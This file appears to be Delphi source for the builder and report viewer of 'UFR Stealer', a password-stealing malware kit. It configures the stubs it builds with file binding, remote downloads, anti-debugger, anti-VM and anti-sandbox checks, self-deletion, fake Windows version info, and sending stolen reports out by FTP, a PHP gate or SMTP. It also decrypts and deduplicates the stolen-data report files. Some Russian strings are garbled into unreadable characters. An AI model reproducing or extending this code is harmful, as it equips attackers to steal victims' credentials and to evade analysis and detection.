    ufr_dword:=0;
    for i:=1 to 3 do
    begin
      p:=pos('.',s2)-1;
      s3:=copy(s2,1,p);
      ufr_dword:=ufr_dword or strtoint(s3);
      ufr_dword:=ufr_dword shl 8;
      delete(s2,1,pos('.',s2));
    end;
    ufr_dword:=ufr_dword or strtoint(s2);
  end;
end;

procedure TForm3.BuildStrucWork;
begin
  SetLength(bs.bind_files,max_arrays_count);
  SetLength(bs.anti_exes,max_arrays_count);
  SetLength(bs.dload_files,max_arrays_count);

  // set some values to BS
  bs.steal_pwd:='';
  bs.steal_key_string:='';
//  bs.steal_key_size:=0;
//  fillchar(bs.steal_key,sizeof(bs.steal_key),0);
  bs.dropto_victim:=false;
  bs.dropto_victim_index:=0;
  bs.selfdel:=false;
  bs.grab_external_ip:=false;
  bs.use_upx:=false;
  bs.write_overlay:=false;
  bs.write_overlay_size:=0;
  bs.sleep_enabled:=false;
  bs.sleep:=0;
  bs.bind:=false;
  bs.bind_run_files_before_after:=0;
  bs.bind_fc:=0;
  bs.dload_fc:=0;
  bs.anti_dbg:=0;
  bs.anti_vbox:=0;
  bs.anti_ws:=0;
  bs.anti_vm:=0;
  bs.anti_anubis:=0;
  bs.anti_sbie:=0;
  bs.anti_procexp:=0;
  bs.anti_procmon:=0;
  bs.anti_filemon:=0;
  bs.anti_regmon:=0;
  bs.anti_fc:=0;
  bs.use_masking:=false;
  bs.adminmanifest:=false;
  bs.change_icon:=false;
  bs.set_vi:=false;
  bs.set_vi_strings[1]:='���������� ����������';
  bs.set_vi_strings[2]:='�������';
  bs.set_vi_strings[3]:='������� Microsoft Windows';
  bs.set_vi_strings[4]:='666';
  bs.set_vi_strings[5]:='666';
  bs.set_vi_strings[6]:='777';
  bs.set_vi_strings[7]:='777';
  bs.copy_to_folder:=true;
  bs.copy_to_folder_name:='ufr_reports';
  bs.hide_files_folder:=true;
  bs.use_ftp:=false;
  bs.ftp_host:='';
  bs.ftp_login:='';
  bs.ftp_pwd:='';
  bs.ftp_pm:=true;
  bs.ftp_tofolder:=false;
  bs.ftp_tofolder_name:='ufr_reports';
  bs.use_gate:=false;
  bs.gate1:='your.freehostia.com';
  bs.gate2:='/gate/ufr.php';
  bs.use_mail:=false;
  bs.mail_from:='mail-from@rambler.ru';
  bs.mail_to:='mail-to@rambler.ru';
  bs.mail_login:='mail-from';
  bs.mail_pwd:='qwerty';
  bs.mail_server:='mail.rambler.ru';
  bs.mail_port:=25;
end;

procedure RegFirstRunCheckWork;
var
  a: TRegistry;
begin
  a := TRegistry.Create;
  a.RootKey := HKEY_CURRENT_USER;
  a.OpenKey('\Software\UFR_Stealer', true);
  if a.ReadString('FirstRun')='1' then
    begin
      a.CloseKey;
      a.Free;
      exit;
    end
  else
    begin
      MessageBox(application.handle,'������� ������ "�������!", ����� ������������ � ��������� �������, �������� � ���������� ������ c UFR Stealer', '������ �� ��...', MB_ICONINFORMATION);
      a.WriteString('FirstRun','1');
      a.CloseKey;
      a.Free
    end;
end;

function StrAnsiToOem(const S: AnsiString): AnsiString;
begin
  SetLength(Result, Length(S));
  AnsiToOemBuff(@S[1], @Result[1], Length(S));
end;

procedure TForm3.GetAllFiles(mask: string);
var
  search: TSearchRec;
  directory: string;
begin
  directory := ExtractFilePath(mask);
  if FindFirst(mask, $23, search) = 0 then
  begin
    repeat
      parser.pwd:=paramstr(4);
      write(StrAnsiToOem('������� '+ExtractFileName(directory + search.Name)+' : '));
      if parser.IsReportPwdProtected(directory + search.Name) then
      begin
        if parser.pwd='' then exit;
      end;
      ret_val:=Parser.DecryptReport(directory + search.Name);
      case ret_val of
        1: begin
             SetConsoleTextAttribute(hstd,FOREGROUND_RED or FOREGROUND_INTENSITY);
             write(StrAnsiToOem('����� �����!'));
             writeln;
           end;
        2: begin
             SetConsoleTextAttribute(hstd,FOREGROUND_RED or FOREGROUND_INTENSITY);
             write(StrAnsiToOem('������ ������ � ������� �� ���������!'));
             writeln;
           end;
        3: begin
             SetConsoleTextAttribute(hstd,FOREGROUND_RED or FOREGROUND_INTENSITY);
             write(StrAnsiToOem(m13));
             writeln;
           end;
      else
             SetConsoleTextAttribute(hstd,FOREGROUND_GREEN or FOREGROUND_INTENSITY);
             write(StrAnsiToOem('������!'));
             writeln;
      end;
      SetConsoleTextAttribute(hstd,FOREGROUND_BLUE or FOREGROUND_GREEN or
                                   FOREGROUND_RED or FOREGROUND_INTENSITY);
      if TreeView1.Items.Count<>0 then
      begin
        if ParamStr(2)='/txt'
        then Form3.SaveDecryptedTree(directory + search.Name, TreeView1.Items, PARSER_TO_TXT);
        if ParamStr(2)='/txtcoll'
        then Form3.SaveDecryptedTree(directory + search.Name, TreeView1.Items, PARSER_TO_TXTCOLLECTABLE);
        if ParamStr(2)='/html'
        then Form3.SaveDecryptedTree(directory + search.Name, TreeView1.Items, PARSER_TO_HTML);
      end;
    until FindNext(search) <> 0;
  end;
  if FindFirst(directory + '*.bin', faDirectory, search) = 0 then 
  begin 
    repeat 
      if ((search.Attr and faDirectory) = faDirectory) and (search.Name[1] <> '.') then
        GetAllFiles(directory + search.Name + '\' + ExtractFileName(mask));
    until FindNext(search) <> 0;
    FindClose(search);
  end;
end;

procedure TForm3.googlesearchClick(Sender: TObject);
begin
  ShellExecuteW(0, nil, pchar('https://www.google.com/search?q='+richedit1.SelText), nil, nil, SW_RESTORE);
end;

procedure TForm3.ParseCmdLineWork;
var
  pfilename:string;
begin
  // command line shit
  if ParamCount > 0 then
  begin
    // Parse report
    if AnsiLowerCase(ParamStr(1))='/p' then
    begin
      if ((AnsiLowerCase(ParamStr(2))='/txt') or (AnsiLowerCase(ParamStr(2))='/html')
      or (AnsiLowerCase(ParamStr(2))='/txtcoll'))
          and (ParamStr(3)<>'') then
      begin
        txtcollfn:='';
        AllocConsole;
        SetConsoleTitle(pchar(StrAnsiToOem('UFR Stealer v'+ufr_ver)));
        hstd:=GetSTDHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hstd,FOREGROUND_BLUE or FOREGROUND_GREEN or
                                     FOREGROUND_RED or FOREGROUND_INTENSITY);
        Writeln(StrAnsiToOem('UFR Stealer v'+ufr_ver));writeln;

        pfilename:=paramstr(3);
        if pfilename='*' then
        begin
          GetAllFiles('*.bin');
        end
        else
        begin
          parser.pwd:=paramstr(4);
          write(StrAnsiToOem('������� '+ExtractFileName(pfilename)+' : '));
          if parser.IsReportPwdProtected(pfilename) then
          begin
            if parser.pwd='' then exit;
          end;
          ret_val:=Parser.DecryptReport(pfilename);
          case ret_val of
            1: begin
                 SetConsoleTextAttribute(hstd,FOREGROUND_RED or FOREGROUND_INTENSITY);
                 write(StrAnsiToOem('����� �����!'));
                 writeln;
               end;
            2: begin
                 SetConsoleTextAttribute(hstd,FOREGROUND_RED or FOREGROUND_INTENSITY);
                 write(StrAnsiToOem('������ ������ � ������� �� ���������!'));
                 writeln;
               end;
            3: begin
                 SetConsoleTextAttribute(hstd,FOREGROUND_RED or FOREGROUND_INTENSITY);
                 write(StrAnsiToOem(m13));
                 writeln;
               end;
          else
                 SetConsoleTextAttribute(hstd,FOREGROUND_GREEN or FOREGROUND_INTENSITY);
                 write(StrAnsiToOem('������!'));
                 writeln;
          end;
          if TreeView1.Items.Count<>0 then
          begin
            if ParamStr(2)='/txt'
            then Form3.SaveDecryptedTree(pfilename, TreeView1.Items, PARSER_TO_TXT);
            if ParamStr(2)='/txtcoll'
            then Form3.SaveDecryptedTree(pfilename, TreeView1.Items, PARSER_TO_TXTCOLLECTABLE);
            if ParamStr(2)='/html'
            then Form3.SaveDecryptedTree(pfilename, TreeView1.Items, PARSER_TO_HTML);
          end;
        end;
        writeln;
        SetConsoleTextAttribute(hstd,FOREGROUND_BLUE or FOREGROUND_GREEN or
                                FOREGROUND_RED or FOREGROUND_INTENSITY);
        Writeln(StrAnsiToOem('������� Enter ��� ���������� ������...'));
        readln;
        FreeConsole;
        ExitProcess(0);
      end;
    end;
  end;
end;

procedure TForm3.FormCreate(Sender: TObject);
begin
  BuildStrucWork;
  VerInfoWork;
  ParseCmdLineWork;
  ImagesWork;
  RegFirstRunCheckWork;
  DragAcceptFiles(Handle, true);
end;

procedure TForm3.Button14Click(Sender: TObject);
begin
EnableWindow(Form3.handle, false);
Application.CreateForm(TForm6, Form6);
end;

procedure TForm3.CheckBox4Click(Sender: TObject);
begin
if checkbox4.checked then
  begin
    label1.Enabled:=true;
    edit1.enabled:=true;
  end
else
  begin
    label1.Enabled:=false;
    edit1.enabled:=false;
  end;
  bs.write_overlay:=checkbox4.Checked;
end;

procedure TForm3.Button19Click(Sender: TObject);
begin
EnableWindow(Form3.handle, false);
Application.CreateForm(TForm1, Form1);
end;

procedure TForm3.Button17Click(Sender: TObject);
begin
EnableWindow(Form3.handle, false);
Application.CreateForm(TForm7, Form7);
end;

procedure TForm3.Button16Click(Sender: TObject);
begin
EnableWindow(Form3.handle, false);
Application.CreateForm(TForm8, Form8);
end;

procedure TForm3.Button4Click(Sender: TObject);
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm9, Form9);
end;

procedure TForm3.TreeView1Change(Sender: TObject; Node: TTreeNode);
var
  k,i: integer;
  z:string;
begin
  richedit1.Text:=string(node.data);
  for i:=1 to length(TYPES) do
    begin
      z:=' '+TYPES[i]+':';
      k:=-length(z);
      repeat
        k:=RichEdit1.FindText(z,k+length(z),
           length(RichEdit1.Text)-k-length(z),[stWholeWord]);
        if k>0 then
        begin
          RichEdit1.SelStart:=k;
          RichEdit1.SelLength:=length(z);
          RichEdit1.SelAttributes.Style:=[fsBold];
          if i in [1,5,6,12,13] then
          RichEdit1.SelAttributes.Color:=RGB($60,$60,$FF)
          else if i in [2,7,8,9,10,11] then
          RichEdit1.SelAttributes.Color:=RGB($60,$FF,$60)
          else if i in [3,4] then
          RichEdit1.SelAttributes.Color:=RGB($FF,$60,$60);
        end;
      until k < 0;
    end;
  RichEdit1.SelStart:=0;
  RichEdit1.Perform(EM_SCROLLCARET, 0, 0);
end;

procedure TForm3.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  ExitProcess(0);
end;

procedure TForm3.WMDropFiles(var Msg: TMessage);
var
  FileName: array[0..256] of char;
begin
  DragQueryFile(THandle(Msg.WParam), 0, FileName, SizeOf(Filename));
  opendialog6.FileName:=FileName;
  if opendialog6.FileName<>'' then
  begin
    DecryptAndProcessResult;
  end;
  DragFinish(THandle(Msg.WParam));
end;

procedure TForm3.ComboBox4Change(Sender: TObject);
begin
  bs.dropto_victim_index:=combobox4.ItemIndex;
end;

procedure TForm3.CheckBox10Click(Sender: TObject);
begin
  bs.selfdel:=checkbox10.Checked;
end;

procedure TForm3.CheckBox11Click(Sender: TObject);
begin
  bs.grab_external_ip:=checkbox11.Checked;
end;

procedure TForm3.CheckBox5Click(Sender: TObject);
begin
  bs.use_upx:=checkbox5.Checked;
end;

procedure TForm3.Edit1Change(Sender: TObject);
var
  dd,errorpos:dword;
begin
  s:=edit1.text;
  val(s,dd,errorpos);
  bs.write_overlay_size:=dd;
end;

procedure TForm3.Button3Click(Sender: TObject);
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm5, Form5);
end;

procedure TForm3.Button5Click(Sender: TObject);
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm12, Form12);
end;

procedure TForm3.Button6Click(Sender: TObject);
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm13, Form13);
end;

function GetTmp:string;
var
  tmp:array [0..255] of char;
begin
  GetTempPath(255, tmp);
  result := StrPas(tmp);
end;

procedure TForm3.Button9Click(Sender: TObject);
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm14, Form14);
end;

procedure TForm3.SpeedButton1Click(Sender: TObject);
begin
  opendialog6.Execute;
  if opendialog6.FileName<>'' then
  begin
    DecryptAndProcessResult;
  end;
end;

procedure TForm3.SpeedButton2Click(Sender: TObject);
begin
  if treeview1.Items.Count=0 then exit;
  if savedialog5.execute then
  begin
    if savedialog5.FilterIndex = 1
    then SaveDecryptedTree(savedialog5.filename, TreeView1.Items, PARSER_TO_TXT)
    else SaveDecryptedTree(savedialog5.filename, TreeView1.Items, PARSER_TO_HTML);
  end;
end;

procedure TForm3.SpeedButton4Click(Sender: TObject);
var
  TmpDir: PChar;
  tmp:string;
begin
  TmpDir := StrAlloc(MAX_PATH);
  GetTempPath(MAX_PATH, TmpDir);
  tmp := string(TmpDir);
  if tmp[Length(tmp)] <> '\' then tmp := tmp + '\';
  StrDispose(TmpDir);
  tmp:=tmp+'Help.html';
  ExtractRes('HELP', 'HELP', tmp);
  ShellExecute(0, nil, pchar(tmp), nil, nil, SW_RESTORE);
end;


procedure TForm3.SpeedButton5Click(Sender: TObject);
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm2, Form2);
end;

procedure TForm3.SpeedButton6Click(Sender: TObject);
begin
  ExitProcess(0);
end;

procedure TForm3.SpeedButton3Click(Sender: TObject);
begin
  if savedialog1.Execute then Struc2Build(savedialog1.FileName,FALSE);
end;

procedure TForm3.sCheckBox1Click(Sender: TObject);
begin
if sCheckBox1.checked then
  begin
    slabel2.Enabled:=true;
    sedit1.enabled:=true;
  end
else
  begin
    slabel2.Enabled:=false;
    sedit1.enabled:=false;
  end;
  bs.sleep_enabled:=sCheckBox1.Checked;
end;

procedure TForm3.sEdit1Change(Sender: TObject);
var
  dd,errorpos:dword;
begin
  s:=sedit1.text;
  val(s,dd,errorpos);
  bs.sleep:=dd;
end;

procedure TForm3.sCheckBox2Click(Sender: TObject);
begin
  bs.adminmanifest:=sCheckBox2.Checked;
end;

procedure TForm3.Copy1Click(Sender: TObject);
begin
  richedit1.CopyToClipboard;
end;

procedure TForm3.Selectall1Click(Sender: TObject);
begin
  richedit1.SelectAll;
end;

procedure TForm3.PopupMenu2Popup(Sender: TObject);
begin
  copy1.Enabled := richedit1.SelText <> '';
  googlesearch.Enabled := richedit1.SelText <> '';
end;

procedure TForm3.sButton1Click(Sender: TObject);
begin
  if sOpenDialog1.Execute then
  begin
    slistbox1.clear;
    slistbox1.Items:=sopendialog1.Files;
    slabel24.Caption:=inttostr(slistbox1.Items.Count);
  end;
end;

procedure TForm3.sButton3Click(Sender: TObject);
var
  i:integer;
  s,d:string;
  f:ansistring;
  ids:tstringlist;
begin
  // some check
  if slistbox1.Items.Count=0 then exit;
  // "report_19-01-2013_14-36-00-BF327174B75C17ADF2C80611CA956D59-KEBC.bin"
  // init
  ids:=tstringlist.Create;
  for i:=0 to slistbox1.Items.Count-1 do
  begin
    s:=slistbox1.Items[i];
    f:=extractfilename(s);
    if (length(f) in [68,69]) and
       (copy(f,1,7 )= 'report_') and
       (f[08] in ['0'..'9']) and
       (f[09] in ['0'..'9']) and
       (f[10] = '-' ) and
       (f[11] in ['0'..'9']) and
       (f[12] in ['0'..'9']) and
       (f[13] = '-' ) and
       (f[14] in ['0'..'9']) and
       (f[15] in ['0'..'9']) and
       (f[16] in ['0'..'9']) and
       (f[17] in ['0'..'9']) and
       (f[18] = '_' ) and
       (f[19] in ['0'..'9']) and
       (f[20] in ['0'..'9']) and
       (f[21] = '-' ) and
       (f[22] in ['0'..'9']) and
       (f[23] in ['0'..'9']) and
       (f[24] = '-' ) and
       (f[25] in ['0'..'9']) and
       (f[26] in ['0'..'9']) and
       (f[27] = '-' ) and
       (f[60] = '-' ) and
       (f[65] = '.' ) then
    begin
      d:=copy(f,28,32);
      ids.Add(d);
    end
    else
    begin
      ids.Add(' ');
    end;
  end;
  // kill dblz in list & filez
  i := 0;
  while i < ids.Count do
  begin
    if (ids[i]<>' ') and (ids.IndexOf(ids[i]) < i) then
    begin
      ids.Delete(i);
      DeleteFile(slistbox1.Items[i]);
      slistbox1.Items.Delete(i);
    end
    else
      inc(i);
  end;
  // show stats
  slabel25.Caption:=inttostr(strtoint(slabel24.Caption)-slistbox1.Items.Count);
  slabel26.Caption:=inttostr(slistbox1.Items.Count);
  ids.Free;
end;

end.

